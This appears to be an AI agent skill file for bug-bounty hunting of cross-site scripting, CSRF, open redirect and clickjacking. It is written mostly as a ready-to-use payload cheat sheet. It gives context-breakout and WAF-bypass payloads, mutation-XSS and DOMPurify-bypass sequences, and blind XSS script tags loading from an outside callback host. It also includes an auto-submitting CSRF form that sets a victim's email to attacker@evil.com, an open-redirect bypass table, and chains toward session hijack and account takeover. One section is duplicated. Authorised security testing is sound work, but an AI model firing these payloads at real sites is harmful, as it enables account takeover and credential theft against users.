---
name: hunt-xss-csrf
description: Hunt client-side vulnerabilities — reflected/stored/DOM XSS, blind XSS, mXSS, CSRF, open redirect, clickjacking. Use when testing user-input reflection points, search boxes, profile fields, markdown rendering, file uploads that render HTML/SVG, OAuth callback handling, or any place untrusted data is rendered in a browser. Trigger keywords: XSS, cross-site scripting, stored XSS, reflected XSS, DOM XSS, blind XSS, CSRF, open redirect, clickjacking, mXSS.
---

# XSS / CSRF / Open Redirect Hunting

Competition is high here — chain for payout or hunt the less-saturated variants (blind XSS, mXSS, DOM sinks, markdown). **XSS alone on a sensitive page (admin/banking) = High. XSS + CSRF token theft → Critical action.**

## XSS Sinks (grep for these)

```js
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)   // string form
setInterval(userInput, ...)
new Function(userInput)

// MEDIUM RISK (context-dependent)
element.src = userInput       // javascript: URI possible
element.href = userInput
location.href = userInput
```

## DOM XSS Sources → Sinks

| Source | Sink |
|---|---|
| `location.hash`, `location.search` | `innerHTML`, `eval`, `document.write`, `jQuery.html()` |
| `document.referrer` | `location.href`, `$.get` callback |
| `window.name` | `document.domain`, `eval` |
| `postMessage` data | `element.src`, `innerHTML` |
| `localStorage`/`sessionStorage` | any sink |

## Testing Flow

1. **Identify reflection points** — every user input echoed in HTML, JS, URL, or attribute context.
2. **Break out of context**:
   - HTML body: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
   - Attribute: `"><svg onload=alert(1)>`
   - JS string: `';alert(1);//`
   - JS block: `</script><script>alert(1)</script>`
   - URL context: `javascript:alert(1)`
3. **WAF bypass basics**: encoding (`&#x3c;`), case (`<ScRiPt>`), unicode separators, comment breaks (`<!--`), `javascript&#58;`.
4. **Blind XSS** — use XSSHunter / interactsh: `"><script src=https://<your-id>.xss.ht></script>`. Fire payloads into forms, feedback, support, headers (User-Agent, Referer) that may be rendered in an admin panel. Any callback = stored XSS in admin = High/Critical.
5. **mXSS (mutation)** — test with `%3Csvg%3E%3Cstyle%3E` sequences and DOMPurify bypasses; browser HTML parsing mangles payloads into executable form.

## Canary Method (systematic, per app)
1. Pick an innocuous unique token e.g. `canaryCanaryCaNaRy`. Send it in every parameter/header/path/body field. If it appears ANYWHERE in the response, that's a reflection point — only then run real payloads.
2. Identify the CONTEXT of each reflection (HTML body / element attr / JS string / JS block / URL) — pick the matching escape payload per context.
3. Level the reflection: same-origin response (confirm `Access-Control-Allow-Origin`) vs JSONP vs cross-origin. Alert if JSONP = JS context.
4. Test 20-30 endpoints per phase: login error, search, sort/filter, date, CSV export, HTML-rich render, error messages, redirect params.
5. For each context, use ONLY the payload for that context. Context mismatch = false negative.

## DOM XSS Deep Dive
DOM XSS happens when a JS sink is reached with attacker-controllable data via source → sink flow. This is the highest-value XSS class on modern SPAs — server-side blacklists never see it.
- **Sources**: `location.search/hash`, `document.referrer`, `window.name`, `postMessage`, `localStorage/sessionStorage`, `cookies`, `document.domain`, `history.pushState/replaceState`, `window.opener`
- **Sinks**: `innerHTML/outerHTML/insertAdjacentHTML`, `document.write`, `eval/setTimeout/setInterval/new Function`, `jQuery .html()/.append()/.after()/.before()/.replaceWith()`, `element.src/href/action`, `location.href/assign/replace`, `window.open`, `setAttribute(name,...)`, `ng-bind-html`/`v-html`
- **Tooling**: map source→sink flows with a headless browser + Burp; grep bundles for sink calls (`jsluice`, `Semgrep`, `Burp DOM Invader`). DOM Invader = fastest.
- **postMessage client-side XSS**: `window.addEventListener("message", function(e){ document.getElementById("x").innerHTML = e.data; })` — a classic. Check ALL `addEventListener("message")` handlers; test with `window.postMessage("PAYLOAD", "*")`. Also check the postMessage targetOrigin validation (`e.origin` check missing or wildcard) — that alone can be a reportable client-side vuln.
- **`document.write` sink**: `document.write(location.hash.substring(1))` — old but still on many admin/app pages.
- **DOM clobbering**: define global variables via HTML — `form`, `name`, `id` attributes; `<form id=x><input name=attributes>` → clobbers `element.attributes` breaking sanitizers.
- **JQuery `$(...)` selector injection**: `$("#<userinput>")` — user input starting with `#`/`.`/`(` can trigger arbitrary selector execution (`<img src=x onerror=alert(1)>`).

## mXSS Sequences (mutation XSS)
Inject these sequences to trigger browser parser mutation bugs (test in multiple browsers — mutation behavior differs):
```
%3Csvg%3E%3Cstyle%3E
<math><mtext><style><mglyph><style><mpath>
</style><img src=x onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
```
DOMPurify bypass classes: mXSS in `style`/`mglyph` nesting, `form`/`math` tag soup, `<noscript>`, `<template>`, `srcdoc`. PayloadsAllTheThings + PortSwigger mXSS page are the reference.

## Blind XSS Target Lists
Low-traffic pages admins view: error logs, 404 logs, support tickets, feedback forms, scheduled reports, invoice generation, cron emails, PDF export of user content, help-desk comments, approval workflows, leaderboard names, review/comment fields in moderation queue.

## XSS Chains (escalate from Medium to High/Critical)
- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass → Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- XSS in chatbot response = stored XSS chain
- XSS in OAuth callback handler = token theft
- XSS + `HttpOnly` missing on session cookie = full session hijack → ATO
- DOM XSS in OAuth/redirect flow → steal `code`/`state` → token theft

## Storage of Blind XSS Payload (XSSHunter / interactsh)
```html
"><script src=//your-id.xss.ht></script>
"><img src=x onerror=alert(document.domain)>
```

## XSS Chains (escalate from Medium to High/Critical)
- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass → Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- XSS in chatbot response = stored XSS chain
- XSS in OAuth callback handler = token theft

## CSRF

### Where it matters (state-changing, authenticated)
- Email/phone/password change, address change, transfer, purchase, logout-of-everywhere
- Test on sensitive actions only (CSRF on non-sensitive action = N/A)

### Testing
```html
<form method="POST" action="https://target.com/change-email">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

### Bypass notes
- CSRF token in cookie but not validated → try removing token entirely
- SameSite=None missing + token not checked = CSRF
- JSON CSRF: `application/x-www-form-urlencoded` with `{"a":1}` body may still parse
- Custom header bypass: if app requires `X-Requested-With`, you can sometimes still forge with fetch `mode: no-cors`

## Open Redirect

### Bypass table (chain into OAuth code theft / phishing)

| Bypass | Payload |
|---|---|
| Double URL encoding | `%252F%252F` |
| Backslash | `https://target.com\@evil.com` |
| Missing protocol | `//evil.com` |
| @-trick | `https://target.com@evil.com` |
| Protocol-relative | `///evil.com` |
| Tab/newline injection | `//evil%09.com` |
| Fragment trick | `https://evil.com#target.com` |
| Null byte | `https://evil.com%00target.com` |
| Parameter pollution | `?next=target.com&next=evil.com` |
| Path confusion | `/redirect/..%2F..%2Fevil.com` |
| Unicode normalization | `https://evil.com/target.com` |

### Params to test
`?redirect=`, `?next=`, `?returnTo=`, `?goto=`, `?url=`, `?dest=`, `?callback=`, `?return=`, `?continue=`

**Open redirect alone = Low/Rejected. Only report when chained (OAuth code theft, credential phishing, SSO bypass).**

## Clickjacking
- `X-Frame-Options` absent + `Content-Security-Policy: frame-ancestors` absent → testable
- Only report on security-sensitive actions (admin actions, money transfer) WITH a working PoC showing the victim would click
- Alone on non-sensitive pages = rejected

## Payload Databases
- XSSHunter: blind XSS detection
- PayloadsAllTheThings XSS section
- PortSwigger XSS cheat sheet
- Browser-rendered markdown: test `<img src=x onerror=...>`, `[link](javascript:...)`, `<iframe>`

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: xss — 1263 disclosed H1 reports (281 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `url`
- `name`
- `callback`
- `email`
- `_m`
- `redirect_uri`
- `state`
- `type`
- `search`
- `id`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Stored XSS in Private Message component (BuddyPress)** (Cross-site Scripting (XSS) - Stored)
  - Signal: ## Description: WordPress version: **5.0.3** BuddyPress version: **4.1.0** Users with accounts can send private messages containing rendered HTML to other uses, this includes being
- **[critical] Stored XSS in markdown via the DesignReferenceFilter** (Cross-site Scripting (XSS) - Stored)
  - Signal: ### Summary When rendering markdown, links to designs are parsed using the following `link_reference_pattern`: https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/models/de
- **[critical] [metascraper] Stored XSS in Open Graph meta properties read by metascrapper** (Cross-site Scripting (XSS) - Stored)
  - Signal: Hi Guys, **metascrapper** is vulnerable to Stored XSS via Open Graph metadata, if they are used in HTML without any sanitization. **Module:** A library to easily scrape metadata fr
- **[critical] xss due to incorrect handling of postmessages** (Cross-site Scripting (XSS) - DOM)
  - Signal: Due to Insecure handling of create link tags (a tags) in a function called `autolink` found in `7Bmt.af733e428f9f986dfc96.js` ```js e = n.autolink(e, !0)); const n = function() { c

### Class: csrf — 293 disclosed H1 reports (55 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `email`
- `authenticity_token`
- `id`
- `redirect_uri`
- `nonce`
- `type`
- `password`
- `code`
- `state`
- `client_id`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] CSRF - Modify Project Settings** (Cross-Site Request Forgery (CSRF))
  - Signal: **Target Url/Endpoint** https://my.stripo.email/cabinet/stripeapi/v1/projects/{Project_Id} **Note** Attacker just need to know victim project Id. ## Summary: This CSRF Vulnerabilit
- **[critical] CSRF to account takeover in https://█████/** (Cross-Site Request Forgery (CSRF))
  - Signal: Hi DoD team, I found a CSRF to account takeover in https://███████/ ## NOTE: Try to open the site in firefox because chrome sometimes is not allowing to open the site. ## Summary: 
- **[critical] Account takeover by changing email** (Cross-Site Request Forgery (CSRF))
  - Signal: The endpoint `/signup/email` allows users to change their email before they confirm their account email. This endpoint is not protected from CSRF. Thus, any account that is not yet
- **[critical] CSRF to account takeover in https://███████.mil/** (Cross-Site Request Forgery (CSRF))
  - Signal: **Summary:** Hello **Description:** ## Impact ## Step-by-step Reproduction Instructions 1. Go to https://███.mil/ and login using your credintials 2. Now Click on change password 3

